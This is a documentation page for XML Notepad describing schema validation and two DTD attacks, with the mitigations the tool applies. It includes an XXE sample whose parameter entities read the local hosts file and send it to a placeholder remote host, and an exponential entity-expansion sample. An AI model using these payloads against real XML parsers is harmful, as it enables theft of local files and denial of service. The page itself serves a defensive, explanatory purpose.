
## Validation

XML Notepad validates your document while you are editing and shows any errors or warnings in the Error List panel. You
can double click those errors to navigate to the node in error so you can then fix it.

XSD Schemas are located using the standard `xsi:schemaLocation` and `xsi:noNamespaceSchemaLocation` attributes where the `xsi`
prefix is bound to the `http://www.w3.org/2001/XMLSchema-instance` namespace or you can specify schemas using the [Schema
Dialog](schemas.md).

Once a schema is associated with your document you will also get prompted by [Intellisense](intellisense.md) for element
and attribute names and values.

## DTD Entity Leakage

Users must be careful about which DTD's they allow XML Notepad to process.  There is a well known attack using malicious DTD's that works like this.  A safer example of this is included
in the XML Notepad samples folder named `DtdEntityLeakage.xml`:


**Step 1** - Create `bait.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root SYSTEM "http://untrusted/MaliciousDtd.dtd" [
<!ELEMENT root (#PCDATA)>
]>
```

**Step 2** - User open `bait.xml` in XML Notepad, unaware that is a malicious XML file.

**Result:** XML Notepad immediately makes an outbound HTTP GET request to the listener```

**The malicious DTD contains parameter entities that read local secrets**
and then sends those secrets to someplace as URL query parameters:
```xml
<!ENTITY % hosts SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
<!ENTITY % leak SYSTEM "http://someplace/bad.dtd&amp;hosts=%hosts;">
<!ENTITY bad "<![CDATA[%leak;]]>">
```

### Impact

Any user who opens a specially crafted XML file in XML Notepad is vulnerable — no clicks beyond opening the file are required. An attacker can use this capture secrets from your
local machine.

### Mitigation

This is why XML Notepad disables DTD processing by default.  If you have DTD's that you
know and trust, then you can safely enable DTD processing using the View/Options dialog
and set `Ignore DTD=False` under Validation options.

### Entity explosion

A malicious DTD can also contain entities that explode into gigabytes of memory by writing
something like this:

```
<!ENTITY e0 "This is some long text that we will replicate exponentially">
<!ENTITY e1 "&e0;&e0;&e0;&e0;&e0;&e0;&e0;&e0;&e0;&e0;">
<!ENTITY e2 "&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;">
<!ENTITY e3 "&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;">
<!ENTITY e4 "&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;">
```

Such a DTD could cause out of memory problems and likely cause the termination of XML Notepad.
This is demonstrated in the XML Notepad samples `DtdEntityExplosion.xml`

### Mitigation

Don't use DTD's in XML Notepad that you do not trust, or set "Ignore DTD" to true in the View/Options dialog.
